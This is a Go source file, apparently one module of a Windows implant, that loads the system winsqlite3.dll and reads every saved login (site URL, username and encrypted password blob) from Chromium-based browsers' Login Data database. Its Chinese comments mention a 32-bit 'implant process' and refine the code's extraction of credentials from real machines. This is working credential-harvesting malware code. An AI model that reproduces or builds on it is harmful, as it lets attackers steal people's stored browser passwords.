//go:build windows && !light

package main

import (
	"errors"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

// ─── winsqlite3（系统自带 SQLite）封装 ─────────────────────────────────────────
//
// 为什么不再手写 SQLite 解析：SQLite 的记录格式是"varint 长度头 + serial type 编码 +
// b-tree cell 的头/尾偏移 + overflow 页链"，字段的字节位置完全取决于记录头里的
// serial type 序列；手写"扫字符串"的解析拿不到任何列边界，只能把相邻 cell 的
// 页内容（含 schema 文本 `CREATE TABLE logins_edge_extended...`、相邻记录的
// username/password 字节）当成当前字段读出来 —— 这正是真机上 password 变成
// "tablelogins_edge_extendedlogins_edge_extended"、url 变成 `.../ui/login.phpadmin`
// 的机制。Windows 10/11 自带 winsqlite3.dll，直接让 SQLite 自己解析（只读打开副本），
// 列边界、overflow、编码全部由 SQLite 保证。
//
// 约束：只读 + 只拷副本；不引入任何 Go 依赖（不链接 CGO）。

const (
	// SQLITE_OPEN_READONLY / SQLITE_OPEN_NOMUTEX
	sqliteOpenReadOnly = 0x00000001
	sqliteOpenNoMutex  = 0x00008000

	sqliteOK   = 0   // SQLITE_OK
	sqliteRow  = 100 // SQLITE_ROW
	sqliteDone = 101 // SQLITE_DONE

	// loginQuery 与 Chromium 的 logins 表列名一致（Chrome/Edge/Brave 通用）。
	loginQuery = "SELECT origin_url, username_value, password_value FROM logins"

	// maxSQLiteColumnBytes 单列读取上限（防御畸形库把指针/长度读成天文数字）。
	maxSQLiteColumnBytes = 1 << 20
)

// errWinSQLiteUnavailable winsqlite3.dll 不可用时的固定文案：上层据此把该段标成
// error，绝不静默返回空列表（"空 = 没有密码"和"空 = 解析不了"必须能区分）。
var errWinSQLiteUnavailable = errors.New("系统缺少 winsqlite3.dll，无法解析浏览器登录数据")

// winSQLite winsqlite3.dll 的函数表（懒解析，一次进程只解析一次）。
type winSQLite struct {
	dll         *syscall.LazyDLL
	openV2      *syscall.LazyProc
	prepareV2   *syscall.LazyProc
	step        *syscall.LazyProc
	finalize    *syscall.LazyProc
	closeFn     *syscall.LazyProc
	columnText  *syscall.LazyProc
	columnBytes *syscall.LazyProc
	columnBlob  *syscall.LazyProc
	errMsg      *syscall.LazyProc
}

var (
	winSQLiteOnce sync.Once
	winSQLiteInst *winSQLite
	winSQLiteErr  error
)

// getWinSQLite 返回进程内唯一的 winsqlite3 句柄（失败也缓存，避免反复加载）。
func getWinSQLite() (*winSQLite, error) {
	winSQLiteOnce.Do(func() {
		winSQLiteInst, winSQLiteErr = newWinSQLite()
	})
	return winSQLiteInst, winSQLiteErr
}

// newWinSQLite 加载 winsqlite3.dll 并解析 9 个函数。
//
// dll 名字：优先用 System32 绝对路径加载（32 位植入进程由 WOW64 自动重定向到
// SysWOW64\winsqlite3.dll，那里也有 32 位版本），避免裸名字在 "当前目录优先" 的
// 搜索顺序下被同名 DLL 劫持；绝对路径失败再退回裸名字 —— 两条都失败才是真的
// "系统缺 winsqlite3.dll"（极老系统 / 被裁剪的精简版 Windows）。
func newWinSQLite() (*winSQLite, error) {
	var dll *syscall.LazyDLL
	for _, candidate := range []string{sysBin("winsqlite3.dll"), "winsqlite3.dll"} {
		d := syscall.NewLazyDLL(candidate)
		if err := d.Load(); err == nil {
			dll = d
			break
		}
	}
	if dll == nil {
		return nil, errWinSQLiteUnavailable
	}

	db := &winSQLite{
		dll:         dll,
		openV2:      dll.NewProc("sqlite3_open_v2"),
		prepareV2:   dll.NewProc("sqlite3_prepare_v2"),
		step:        dll.NewProc("sqlite3_step"),
		finalize:    dll.NewProc("sqlite3_finalize"),
		closeFn:     dll.NewProc("sqlite3_close"),
		columnText:  dll.NewProc("sqlite3_column_text"),
		columnBytes: dll.NewProc("sqlite3_column_bytes"),
		columnBlob:  dll.NewProc("sqlite3_column_blob"),
		errMsg:      dll.NewProc("sqlite3_errmsg"),
	}
	for _, p := range []*syscall.LazyProc{
		db.openV2, db.prepareV2, db.step, db.finalize, db.closeFn,
		db.columnText, db.columnBytes, db.columnBlob, db.errMsg,
	} {
		if err := p.Find(); err != nil {
			return nil, errWinSQLiteUnavailable
		}
	}
	return db, nil
}

// sqliteLoginRow logins 表的一行原始数据（password_value 保持原始字节，未解密）。
type sqliteLoginRow struct {
	OriginURL string
	Username  string
	Password  []byte
}

// readChromiumLoginRows 以只读方式打开（**已经复制到临时目录的**）Login Data 并取全部行。
func readChromiumLoginRows(dbPath string) ([]sqliteLoginRow, error) {
	db, err := getWinSQLite()
	if err != nil {
		return nil, err
	}
	return db.readLoginData(dbPath)
}

func (d *winSQLite) readLoginData(dbPath string) ([]sqliteLoginRow, error) {
	cPath, err := syscall.BytePtrFromString(dbPath)
	if err != nil {
		return nil, fmt.Errorf("Login Data 路径无法转换: %v", err)
	}

	var db uintptr
	rc, _, _ := d.openV2.Call(
		uintptr(unsafe.Pointer(cPath)),
		uintptr(unsafe.Pointer(&db)),
		uintptr(sqliteOpenReadOnly|sqliteOpenNoMutex),
		0,
	)
	if rc != sqliteOK || db == 0 {
		msg := d.errorText(db)
		if db != 0 {
			d.closeFn.Call(db)
		}
		return nil, fmt.Errorf("打开 Login Data 失败 (sqlite rc=%d): %s", rc, msg)
	}
	// 保证句柄一定关闭（临时副本随后由调用方删除；Windows 上文件被打开时删不掉）。
	defer d.closeFn.Call(db)

	cSQL, err := syscall.BytePtrFromString(loginQuery)
	if err != nil {
		return nil, fmt.Errorf("SQL 无法转换: %v", err)
	}
	var stmt uintptr
	rc, _, _ = d.prepareV2.Call(
		db,
		uintptr(unsafe.Pointer(cSQL)),
		uintptr(len(loginQuery)),
		uintptr(unsafe.Pointer(&stmt)),
		0,
	)
	if rc != sqliteOK || stmt == 0 {
		return nil, fmt.Errorf("准备 logins 查询失败 (sqlite rc=%d): %s", rc, d.errorText(db))
	}
	defer d.finalize.Call(stmt)

	var rows []sqliteLoginRow
	for {
		rc, _, _ = d.step.Call(stmt)
		if rc == sqliteDone {
			break
		}
		if rc != sqliteRow {
			return rows, fmt.Errorf("读取 logins 行失败 (sqlite rc=%d): %s", rc, d.errorText(db))
		}
		rows = append(rows, sqliteLoginRow{
			OriginURL: d.columnTextString(stmt, 0),
			Username:  d.columnTextString(stmt, 1),
			Password:  d.columnBytesCopy(stmt, 2),
		})
	}
	return rows, nil
}

// columnTextString 读 TEXT 列（NULL 返回空串）。
func (d *winSQLite) columnTextString(stmt uintptr, i int) string {
	p, _, _ := d.columnText.Call(stmt, uintptr(i))
	if p == 0 {
		return ""
	}
	n, _, _ := d.columnBytes.Call(stmt, uintptr(i))
	if n == 0 || n > maxSQLiteColumnBytes {
		return ""
	}
	return string(unsafe.Slice((*byte)(unsafe.Pointer(p)), int(n)))
}

// columnBytesCopy 读 BLOB 列并**复制**一份（SQLite 的指针在 step/finalize 后失效；
// password_value 是二进制密文，用 column_blob 而不是 column_text，避免隐式转文本）。
func (d *winSQLite) columnBytesCopy(stmt uintptr, i int) []byte {
	p, _, _ := d.columnBlob.Call(stmt, uintptr(i))
	if p == 0 {
		return nil
	}
	n, _, _ := d.columnBytes.Call(stmt, uintptr(i))
	if n == 0 || n > maxSQLiteColumnBytes {
		return nil
	}
	out := make([]byte, int(n))
	copy(out, unsafe.Slice((*byte)(unsafe.Pointer(p)), int(n)))
	return out
}

// errorText 取 sqlite3_errmsg（仅用于错误文案）。
func (d *winSQLite) errorText(db uintptr) string {
	if db == 0 || d.errMsg == nil {
		return "unknown error"
	}
	p, _, _ := d.errMsg.Call(db)
	if p == 0 {
		return "unknown error"
	}
	b := unsafe.Slice((*byte)(unsafe.Pointer(p)), 512)
	for i, c := range b {
		if c == 0 {
			return strings.TrimSpace(string(b[:i]))
		}
	}
	return strings.TrimSpace(string(b))
}
